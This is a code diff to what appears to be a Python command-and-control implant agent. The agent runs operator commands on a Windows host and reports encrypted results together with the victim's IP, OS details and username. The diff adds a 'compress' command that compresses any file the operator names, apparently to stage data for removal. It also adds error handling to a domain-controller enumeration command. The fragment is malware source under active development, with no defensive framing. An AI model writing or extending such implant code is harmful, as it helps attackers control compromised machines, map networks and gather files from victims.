@@ -48,6 +48,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.get_scheduled_task_info import get_scheduled_task_info
     from utils.winapi.cat import cat
     from utils.winapi.start_scheduled_task import start_scheduled_task
+    from utils.winapi.compress import compress_file
 
 logging.getLogger("httpx").setLevel(logging.WARNING)
 logging.getLogger("supabase").setLevel(logging.WARNING)
@@ -251,6 +252,17 @@ def execute_commands(agent_id):
                     result = get_domain_controllers()
                     status = 'Completed'
                     output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('compress'):
+                try:
+                    file_path = command_text.split(' ', 1)[1]
+                    result = compress_file(file_path)
+                    status = 'Completed'
+                    output = f"File compressed successfully: {result}"
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
